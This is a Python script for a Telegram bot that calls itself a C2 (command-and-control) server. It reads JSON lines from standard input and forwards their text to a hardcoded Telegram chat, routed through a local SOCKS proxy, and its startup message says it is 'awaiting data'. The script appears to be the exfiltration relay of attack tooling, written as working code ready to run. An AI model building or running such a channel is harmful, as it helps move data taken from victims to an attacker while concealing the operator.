import os
import sys
import json
import requests
import threading
import time

# Ensure PySocks for proxy support
try:
    import socks
except ImportError:
    print("[TG] PySocks not installed, proxy may fail", flush=True)

TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
TG_CHAT_ID = "708684405"
TG_PROXY = "socks5h://127.0.0.1:1080"
_use_proxy = True


def tg_req(method, url, **kwargs):
    global _use_proxy
    kwargs.setdefault("timeout", 10)
    proxies = {"http": TG_PROXY, "https": TG_PROXY} if _use_proxy else None
    kwargs["proxies"] = proxies
    try:
        return requests.request(method, url, **kwargs)
    except Exception:
        if _use_proxy:
            print("[TG] proxy failed, fallback to direct", flush=True)
            _use_proxy = False
            kwargs["proxies"] = None
            return requests.request(method, url, **kwargs)
        raise


def send_tg(text):
    try:
        url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
        r = tg_req("POST", url, json={"chat_id": TG_CHAT_ID, "text": text, "parse_mode": "HTML"})
        print(f"[TG] send: {r.status_code}", flush=True)
    except Exception as e:
        print(f"[TG] send error: {e}", flush=True)


def poll_loop():
    last_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/getUpdates"
            r = tg_req("GET", url, params={"offset": last_id + 1, "timeout": 5})
            if r.status_code != 200:
                time.sleep(3)
                continue
            for u in r.json().get("result", []):
                last_id = u["update_id"]
                msg = u.get("message", {})
                text = msg.get("text", "")
                chat_id = msg["chat"]["id"]
                print(f"[TG] msg: chat={chat_id} text={text}", flush=True)
                if text == "/start":
                    tg_req("POST",
                        f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage",
                        json={"chat_id": chat_id, "text": "✅ Бот активен. Ожидаю данные..."}
                    )
        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            print(f"[TG] poll error: {e}", flush=True)
        time.sleep(1)


def stdin_loop():
    for line in sys.stdin:
        line = line.strip()
        if line:
            try:
                data = json.loads(line)
                send_tg(data["text"])
            except Exception as e:
                print(f"[TG] stdin parse error: {e}", flush=True)


if __name__ == "__main__":
    print("[TG] Bot started", flush=True)
    send_tg("✅ <b>C2 Server запущен</b>")
    t = threading.Thread(target=poll_loop, daemon=True)
    t.start()
    stdin_loop()
